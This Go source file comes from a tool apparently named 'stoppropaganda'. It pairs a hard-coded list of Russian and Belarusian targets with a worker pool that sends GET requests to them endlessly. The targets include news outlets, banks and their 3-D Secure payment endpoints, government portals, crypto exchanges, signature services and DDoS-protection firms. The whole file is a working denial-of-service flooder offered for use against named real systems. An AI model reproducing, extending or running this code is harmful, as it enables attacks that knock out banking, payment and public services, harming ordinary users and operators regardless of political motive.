package stoppropaganda

import (
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/customresolver"
	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/customtcpdial"
	"github.com/erkexzcx/stoppropaganda/internal/stoppropaganda/resolvefix"
	"github.com/valyala/fasthttp"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233

const VALIDATE_DNS_EVERY = 5 * time.Minute

var targetWebsites = map[string]struct{}{
	/* Other countries */

	"https://bukimevieningi.lt": {},
	"https://musutv.lt":         {},
	"https://api.musutv.lt":     {},
	"https://baltnews.lt":       {},
	"https://lt.rubaltic.ru":    {},
	"http://sputniknews.lt":     {},
	"https://lv.sputniknews.ru": {},
	"https://viada.lt":          {},
	"https://api.viada.lt":      {},
	"https://www.sber.kz":       {},
	"https://www.sberbank.kz":   {},

	/* Russia */

	// Propaganda
	"https://lenta.ru":                       {},
	"https://ria.ru":                         {},
	"https://ria.ru/lenta":                   {},
	"https://www.rbc.ru":                     {},
	"https://www.rt.com":                     {},
	"https://api.rt.com":                     {},
	"https://smotrim.ru":                     {},
	"https://api.smotrim.ru":                 {},
	"https://tass.ru":                        {},
	"https://api.tass.ru":                    {},
	"https://tvzvezda.ru":                    {},
	"https://vsoloviev.ru":                   {},
	"https://www.1tv.ru":                     {},
	"https://api.1tv.ru":                     {},
	"https://www.vesti.ru":                   {},
	"https://zakupki.gov.ru":                 {},
	"https://er.ru":                          {},
	"https://www.rzd.ru":                     {},
	"https://rzdlog.ru":                      {},
	"https://vgtrk.ru":                       {},
	"https://www.interfax.ru":                {},
	"https://ugmk.ua":                        {},
	"https://iz.ru":                          {},
	"https://vz.ru":                          {},
	"https://sputniknews.ru":                 {},
	"https://www.gazeta.ru":                  {},
	"https://www.kp.ru":                      {},
	"https://riafan.ru":                      {},
	"https://api.riafan.ru":                  {},
	"https://pikabu.ru":                      {},
	"https://api.pikabu.ru":                  {},
	"https://www.kommersant.ru":              {},
	"https://omk.ru":                         {},
	"https://www.yaplakal.com":               {},
	"https://bezformata.com":                 {},
	"https://api.bezformata.com":             {},
	"https://regnum.ru":                      {},
	"https://eadaily.com":                    {},
	"https://www.rubaltic.ru":                {},
	"https://www.rambler.ru":                 {},
	"https://mail.ru":                        {},
	"https://simferopol.miranda-media.ru":    {},
	"https://sevastopol.miranda-media.ru":    {},
	"https://novoozernoye.miranda-media.ru":  {},
	"https://feodosia.miranda-media.ru":      {},
	"https://yalta.miranda-media.ru":         {},
	"https://alupka.miranda-media.ru":        {},
	"https://inkerman.miranda-media.ru":      {},
	"https://primorskij.miranda-media.ru":    {},
	"https://oliva.miranda-media.ru":         {},
	"https://foros.miranda-media.ru":         {},
	"https://chernomorskoe.miranda-media.ru": {},
	"https://kirovskoe.miranda-media.ru":     {},

	// Business corporations
	"https://www.gazprom.ru":                    {},
	"https://lukoil.ru":                         {},
	"https://magnit.ru":                         {},
	"https://www.nornickel.com":                 {},
	"https://www.surgutneftegas.ru":             {},
	"https://www.tatneft.ru":                    {},
	"https://www.evraz.com/ru":                  {},
	"https://nlmk.com":                          {},
	"https://www.sibur.ru":                      {},
	"https://www.severstal.com":                 {},
	"https://www.metalloinvest.com":             {},
	"https://nangs.org":                         {},
	"https://api.nangs.org":                     {},
	"https://rmk-group.ru/ru":                   {},
	"https://www.tmk-group.ru":                  {},
	"https://ya.ru":                             {},
	"https://yandex.ru":                         {},
	"https://yandex.com":                        {},
	"https://any.yandex.ru":                     {},
	"https://disk.yandex.com":                   {},
	"https://eda.yandex":                        {},
	"https://mail.yandex.ru":                    {},
	"https://market.yandex.ru":                  {},
	"https://metrica.yandex.ru":                 {},
	"https://music.yandex.ru":                   {},
	"https://translate.yandex.ru":               {},
	"https://www.polymetalinternational.com/ru": {},
	"https://www.uralkali.com/ru":               {},
	"https://www.eurosib.ru":                    {},
	"https://www.wildberries.ru":                {},
	"https://www.ozon.ru":                       {},
	"https://www.avito.ru":                      {},
	"https://www.dns-shop.ru":                   {},
	"https://aliexpress.ru":                     {},
	"https://privetmir.ru":                      {},
	"https://mironline.ru":                      {},
	"https://sbp.nspk.ru":                       {},
	"https://nspk.ru":                           {},
	"https://nspk.com":                          {},

	// Banks
	"https://www.sberbank.ru":                           {},
	"https://online.sberbank.ru":                        {},
	"https://api.developer.sber.ru/product/SberbankID":  {},
	"https://api.sberbank.ru/prod/tokens/v2":            {},
	"https://api.sberbank.ru/prod/tokens/v2/oauth":      {},
	"https://api.sberbank.ru/prod/tokens/v2/oidc":       {},
	"https://www.vtb.ru":                                {},
	"https://api.vtb.ru":                                {},
	"https://www.gazprombank.ru":                        {},
	"https://api.gazprombank.ru":                        {},
	"https://www.moex.com":                              {},
	"https://api.moex.com":                              {},
	"http://www.fsb.ru":                                 {},
	"https://scr.online.sberbank.ru/api/fl/idgib-w-3ds": {},
	"https://3dsec.sberbank.ru/mportal3/auth/login":     {},
	"https://acs1.sbrf.ru":                              {},
	"https://acs2.sbrf.ru":                              {},
	"https://acs3.sbrf.ru":                              {},
	"https://acs4.sbrf.ru":                              {},
	"https://acs5.sbrf.ru":                              {},
	"https://acs6.sbrf.ru":                              {},
	"https://acs7.sbrf.ru":                              {},
	"https://acs8.sbrf.ru":                              {},

	//The state
	"https://gosuslugi.ru":           {},
	"https://www.mos.ru/uslugi":      {},
	"https://api.mos.ru":             {},
	"http://kremlin.ru":              {},
	"http://en.kremlin.ru":           {},
	"http://government.ru":           {},
	"https://mil.ru":                 {},
	"https://www.nalog.gov.ru":       {},
	"https://customs.gov.ru":         {},
	"https://pfr.gov.ru":             {},
	"https://rkn.gov.ru":             {},
	"https://www.gosuslugi.ru":       {},
	"https://gosuslugi41.ru":         {},
	"https://uslugi27.ru":            {},
	"https://gosuslugi29.ru":         {},
	"https://gosuslugi.astrobl.ru":   {},
	"http://pochta.ru":               {},
	"http://crimea-post.ru":          {},
	"https://ca.vks.rosguard.gov.ru": {},

	// Embassy
	"https://montreal.mid.ru": {},

	// Others
	"https://109.207.1.118":          {},
	"https://109.207.1.97":           {},
	"https://mail.rkn.gov.ru":        {},
	"https://cloud.rkn.gov.ru":       {},
	"https://mvd.gov.ru":             {},
	"https://pwd.wto.economy.gov.ru": {},
	"https://stroi.gov.ru":           {},
	"https://proverki.gov.ru":        {},
	"https://shop-rt.com":            {},
	"https://www.glonass-iac.ru":     {},

	// Exchanges connected to russian banks
	"https://cleanbtc.ru":         {},
	"https://api.cleanbtc.ru":     {},
	"https://bonkypay.com":        {},
	"https://changer.club":        {},
	"https://api.changer.club":    {},
	"https://superchange.net":     {},
	"https://api.superchange.net": {},
	"https://mine.exchange":       {},
	"https://api.mine.exchange":   {},
	"https://platov.co":           {},
	"https://ww-pay.net":          {},
	"https://delets.cash":         {},
	"https://betatransfer.org":    {},
	"https://ramon.money":         {},
	"https://coinpaymaster.com":   {},
	"https://bitokk.biz":          {},
	"https://www.netex24.net":     {},
	"https://api.netex24.net":     {},
	"https://cashbank.pro":        {},
	"https://flashobmen.com":      {},
	"https://abcobmen.com":        {},
	"https://ychanger.net":        {},
	"https://multichange.net":     {},
	"https://24paybank.ne":        {},
	"https://royal.cash":          {},
	"https://prostocash.com":      {},
	"https://baksman.org":         {},
	"https://kupibit.me":          {},

	// Electronic signature services
	"https://iecp.ru":             {},
	"https://api.iecp.ru":         {},
	"https://uc-osnovanie.ru":     {},
	"https://api.uc-osnovanie.ru": {},
	"http://www.nucrf.ru":         {},
	"http://www.belinfonalog.ru":  {},
	"http://www.roseltorg.ru":     {},
	"https://api.roseltorg.ru":    {},
	"http://www.astralnalog.ru":   {},
	"http://www.nwudc.ru":         {},
	"http://www.center-inform.ru": {},
	"https://kk.bank/UdTs":        {},
	"http://structure.mil.ru":     {},
	"http://www.ucpir.ru":         {},
	"http://dreamkas.ru":          {},
	"http://www.e-portal.ru":      {},
	"https://api.e-portal.ru":     {},
	"http://izhtender.ru":         {},
	"http://imctax.parus-s.ru":    {},
	"http://www.icentr.ru":        {},
	"http://www.kartoteka.ru":     {},
	"https://api.kartoteka.ru":    {},
	"http://rsbis.ru":             {},
	"http://www.stv-it.ru":        {},
	"http://www.crypset.ru":       {},
	"http://www.kt-69.ru":         {},
	"http://www.24ecp.ru":         {},
	"http://kraskript.com":        {},
	"http://ca.ntssoft.ru":        {},
	"http://www.y-center.ru":      {},
	"http://www.rcarus.ru":        {},
	"http://rk72.ru":              {},
	"http://squaretrade.ru":       {},
	"http://ca.gisca.ru":          {},
	"http://www.otchet-online.ru": {},
	"http://udcs.ru":              {},
	"http://www.cit-ufa.ru":       {},
	"http://api.cit-ufa.ru":       {},
	"http://elkursk.ru":           {},
	"http://www.icvibor.ru":       {},
	"http://ucestp.ru":            {},
	"https://api.ucestp.ru":       {},
	"http://mcspro.ru":            {},
	"http://www.infotrust.ru":     {},
	"http://epnow.ru":             {},
	"http://ca.kamgov.ru":         {},
	"http://mascom-it.ru":         {},
	"http://cfmc.ru":              {},

	/* BELARUS */

	// by gov
	"https://mininform.gov.by":       {},
	"https://rec.gov.by/ru":          {},
	"https://www.mil.by":             {},
	"https://www.government.by":      {},
	"https://president.gov.by/ru":    {},
	"https://www.mvd.gov.by/ru":      {},
	"http://www.kgb.by/ru":           {},
	"https://www.prokuratura.gov.by": {},
	"http://mfa.gov.by":              {},
	"http://russia.mfa.gov.by":       {},

	// by banks
	"https://www.nbrb.by":                 {},
	"https://belarusbank.by":              {},
	"https://brrb.by":                     {},
	"https://www.belapb.by":               {},
	"https://bankdabrabyt.by":             {},
	"https://belinvestbank.by/individual": {},
	"https://api.belinvestbank.by/":       {},
	"https://belpost.by":                  {},

	// by business
	"https://bgp.by/ru":           {},
	"https://www.belneftekhim.by": {},
	"http://www.bellegprom.by":    {},
	"https://www.energo.by":       {},
	"http://belres.by/ru":         {},
	"http://rw.by":                {},

	// by media
	"http://belta.by":             {},
	"https://sputnik.by":          {},
	"https://www.tvr.by":          {},
	"https://www.sb.by":           {},
	"https://belmarket.by":        {},
	"https://www.belarus.by":      {},
	"https://belarus24.by":        {},
	"https://ont.by":              {},
	"https://www.024.by":          {},
	"https://www.belnovosti.by":   {},
	"https://api.belnovosti.by":   {},
	"https://mogilevnews.by":      {},
	"https://yandex.by":           {},
	"https://www.slonves.by":      {},
	"http://www.ctv.by":           {},
	"https://radiobelarus.by":     {},
	"https://radiusfm.by":         {},
	"https://alfaradio.by":        {},
	"https://radiomir.by":         {},
	"https://api.radiomir.by":     {},
	"https://radiostalica.by":     {},
	"https://radiobrestfm.by":     {},
	"https://api.radiobrestfm.by": {},
	"https://www.tvrmogilev.by":   {},
	"https://minsknews.by":        {},
	"https://api.minsknews.by":    {},
	"https://zarya.by":            {},
	"https://grodnonews.by":       {},

	/* DDOS mitigation */
	"https://ddos-guard.net/ru": {},
	"https://stormwall.pro":     {},
	"https://qrator.net/ru":     {},
	"https://solidwall.ru":      {},
}

type WebsiteStatus struct {
	Requests     uint   `json:"requests"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`
	Status       string `json:"status"`

	Counter_code100 uint `json:"status_100"`
	Counter_code200 uint `json:"status_200"`
	Counter_code300 uint `json:"status_300"`
	Counter_code400 uint `json:"status_400"`
	Counter_code500 uint `json:"status_500"`
}

func (ws *WebsiteStatus) IncreaseCounters(responseCode int) {
	ws.Requests++
	switch {
	case responseCode < 200:
		ws.Counter_code100++
	case responseCode < 300:
		ws.Counter_code200++
	case responseCode < 400:
		ws.Counter_code300++
	case responseCode < 500:
		ws.Counter_code400++
	default:
		ws.Counter_code500++
	}
}

func (ws *WebsiteStatus) IncreaseCountersErr(errMsg string) {
	if !strings.Contains(errMsg, customtcpdial.ErrTooFastDialSpam.Error()) {
		ws.Requests++
		ws.Errors++
		ws.LastErrorMsg = errMsg
	}
}

type Website struct {
	mux    sync.Mutex
	Status WebsiteStatus
	host   string

	validateMux    sync.Mutex
	dnsLastChecked time.Time
	unpauseTime    time.Time

	req *fasthttp.Request
}

var httpClient *fasthttp.Client

var websites = map[string]*Website{}

func startWebsites() {
	for website := range targetWebsites {
		websiteURL, err := url.Parse(website)
		if err != nil {
			panic(err)
		}

		newReq := fasthttp.AcquireRequest()
		newReq.SetRequestURI(website)
		newReq.Header.SetMethod(fasthttp.MethodGet)
		newReq.Header.Set("Host", websiteURL.Host)
		newReq.Header.Set("User-Agent", *flagUserAgent)
		newReq.Header.Set("Accept", "*/*")

		websites[website] = &Website{
			host: websiteURL.Host,
			Status: WebsiteStatus{
				Status: "Initializing",
			},
			dnsLastChecked: time.Now().Add(-1 * VALIDATE_DNS_EVERY), // this forces to validate on first run
			unpauseTime:    time.Now(),
			req:            newReq,
		}
	}

	websitesChannel := make(chan *Website, *flagWorkers)

	// Spawn workers
	for i := 0; i < *flagWorkers; i++ {
		go runWebsiteWorker(websitesChannel)
	}

	// Issue tasks
	go func() {
		for {
			for _, website := range websites {
				websitesChannel <- website
			}
		}
	}()
}

func (ws *Website) paused() bool {
	ws.mux.Lock()
	defer ws.mux.Unlock()
	return time.Now().Before(ws.unpauseTime)
}

func (ws *Website) setPaused(duration time.Duration, reason string) {
	ws.mux.Lock()
	defer ws.mux.Unlock()
	ws.Status.Status = "Paused: " + reason
	ws.unpauseTime = time.Now().Add(duration)
}

func (ws *Website) allowedToRun() bool {
	if !ws.paused() {
		ws.validateMux.Lock()
		defer ws.validateMux.Unlock()

		// Exit if first worker in the mux queue has paused the website
		if ws.paused() {
			return false
		}

		ipAddresses, err := customresolver.GetIPs(ws.host)

		if err != nil {
			errStr := err.Error()
			switch {
			case strings.HasSuffix(errStr, "Temporary failure in name resolution") || strings.HasSuffix(errStr, "connection refused"):
				ws.setPaused(time.Second, "Your DNS servers unreachable or returned an error: "+errStr)
				return false
			case strings.HasSuffix(errStr, "no such host"):
				ws.setPaused(5*time.Minute, "Domain does not exist: "+errStr)
				return false
			case strings.HasSuffix(errStr, "No address associated with hostname"):
				ws.setPaused(5*time.Minute, "Domain does not have any IPs assigned: "+errStr)
				return false
			default:
				ws.setPaused(10*time.Second, errStr)
				return false
			}
		}

		if err = resolvefix.CheckNonPublicIP(ipAddresses); err != nil {
			ws.setPaused(5*time.Minute, err.Error())
			return false
		}
		return true
	}
	return false
}

func runWebsiteWorker(c chan *Website) {
	// Each worker has it's own response
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()

	for {
		ws := <-c
		if !ws.allowedToRun() {
			continue
		}

		ws.req.CopyTo(req) // https://github.com/valyala/fasthttp/issues/53#issuecomment-185125823

		// Perform request
		err := httpClient.DoTimeout(req, resp, *flagTimeout)
		if err != nil {
			ws.mux.Lock()
			ws.Status.IncreaseCountersErr("httpClient.Do: " + err.Error())
			ws.mux.Unlock()
			continue
		}

		// Increase counters
		ws.mux.Lock()
		ws.Status.IncreaseCounters(resp.StatusCode())
		ws.mux.Unlock()
	}
}
